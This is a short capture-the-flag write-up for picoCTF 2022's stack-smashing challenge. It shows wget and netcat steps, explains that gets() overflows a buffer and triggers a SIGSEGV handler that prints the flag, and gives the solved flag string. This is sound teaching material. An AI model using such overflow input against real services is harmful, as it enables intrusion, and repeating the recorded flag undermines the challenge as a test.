#pico2022 #binaryexploitation 

## Challenge:
```md
Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/520/vuln). You can view source [here](https://artifacts.picoctf.net/c/520/vuln.c). And connect with it using: `nc saturn.picoctf.net 53935`
```

## Process:
First step was to wget the program and source.
```bash
wget -q https://artifacts.picoctf.net/c/520/vuln # Program
wget -q https://artifacts.picoctf.net/c/520/vuln.c # Source
```
#wget 

Then I ran the given netcat command.
```bash
nc saturn.picoctf.net 53935
```
#netcat  #nc 

Then I made the given vuln program executable.
```bash
chmod +x vuln
```
#chmod

Running the vuln program resulted in:
	Please create 'flag.txt' in this directory with your own debugging flag.Please create 'flag.txt' in this directory with your own debugging flag.

After this I decided to take a look at the vuln.c file.

Within this file I noticed how the flag would be printed. It's handled in a **sigsegv_handler()** function. 

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);a
  exit(1);
}

...

signal(SIGSEGV, sigsegv_handler);
```
#c

SIGSEGV stands for *segmentation fault*. A segmentation fault is an error raised by memory-protected hardware whenever it tries to access a memory address that is either restricted or does not exist.
#segmentationfault

On line 40 of the c file the **gets()** function is called.
```c
gets(buf1)
```
#c 

This reads the *buf1*, the user's input, onto the stack. The **gets()** function will write the user's input to the stack without regard for its allocated length. The user  can then overflow the length resulting in a segmentation fault.

So I ran...
```shell
nc saturn.picoctf.net 53935
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaa
```
#netcat #nc

Which resulted in the flag being given.

**Flag: *picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}***